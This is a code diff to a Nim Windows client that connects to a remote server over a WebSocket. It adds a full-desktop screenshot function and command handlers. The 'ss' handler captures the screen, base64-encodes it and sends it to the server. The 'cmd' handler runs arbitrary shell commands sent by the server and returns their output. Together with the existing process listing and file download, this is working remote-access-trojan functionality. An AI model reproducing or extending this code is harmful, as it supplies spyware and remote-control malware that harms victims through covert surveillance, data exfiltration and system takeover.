@@ -1,4 +1,6 @@
-import asyncdispatch, ws, json, strutils, os,winim/com,winim,system,std/[asyncdispatch, httpclient, osproc]
+import asyncdispatch, ws, json, strutils, os,winim/com,winim,system,std/[asyncdispatch, httpclient, osproc,base64,strformat],times
+import winim/lean
+import nimPNG
 
 proc getProcessList(): seq[string] =
   var wmi = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
@@ -116,6 +118,40 @@ proc downloadFile(link: string, name: string): Future[bool] {.async.} =
   finally:
     client.close()
 
+proc takeScreenshot(filename: string) =
+  let virtualWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN)
+  let virtualHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN)
+  let virtualX = GetSystemMetrics(SM_XVIRTUALSCREEN)
+  let virtualY = GetSystemMetrics(SM_YVIRTUALSCREEN)
+
+  let hdcScreen = GetDC(0)
+  let hdcMem = CreateCompatibleDC(hdcScreen)
+  let hBitmap = CreateCompatibleBitmap(hdcScreen, virtualWidth, virtualHeight)
+  let hOld = SelectObject(hdcMem, hBitmap)
+  BitBlt(hdcMem, 0, 0, virtualWidth, virtualHeight, hdcScreen, virtualX, virtualY, SRCCOPY)
+  SelectObject(hdcMem, hOld)
+
+  var bi: BITMAPINFO
+  bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER).DWORD
+  bi.bmiHeader.biWidth = virtualWidth
+  bi.bmiHeader.biHeight = -virtualHeight 
+  bi.bmiHeader.biPlanes = 1
+  bi.bmiHeader.biBitCount = 32
+  bi.bmiHeader.biCompression = BI_RGB
+
+  var pixels = newSeq[byte](virtualWidth * virtualHeight * 4)
+  discard GetDIBits(hdcMem, hBitmap, 0, virtualHeight.UINT, pixels[0].addr, bi.addr, DIB_RGB_COLORS)
+  for i in countup(0, pixels.high, 4):
+    swap(pixels[i], pixels[i+2])
+
+
+  discard savePNG32(filename, pixels, virtualWidth, virtualHeight)
+
+  DeleteObject(hBitmap)
+  DeleteDC(hdcMem)
+  ReleaseDC(0, hdcScreen)
+
+
 proc main() {.async.} =
   var ws: WebSocket
 
@@ -229,8 +265,36 @@ proc main() {.async.} =
             "data": "OS error: " & e.msg
           }
           await ws.send($responseJson)
+      
+      elif command.startsWith("ss"):
+        echo "ss"
+        let screenshotPath = "ss.png"
+        takeScreenshot(screenshotPath)
+        let imageData = readFile(screenshotPath)
+        let enc = encode(imageData)
+        let responseJson = %* {
+              "type": "exec",
+              "client_id": client,
+              "state": "error",
+              "command": command,
+              "data": enc
+        }
+        await ws.send($responseJson)
+      
+      elif command.startsWith("cmd"):
+        let (output, exitCode) = execCmdEx(command)
+        echo command
+        echo output
+        let responseJson = %* {
+          "type": "exec",
+          "client_id": client,
+          "state": "res",
+          "command": command.splitWhitespace()[0] ,
+          "data": output
+        }
+        await ws.send($responseJson)
+        echo "Sent response: ", $responseJson
 
-        
   ws.close()
   echo "WebSocket connection closed."
 
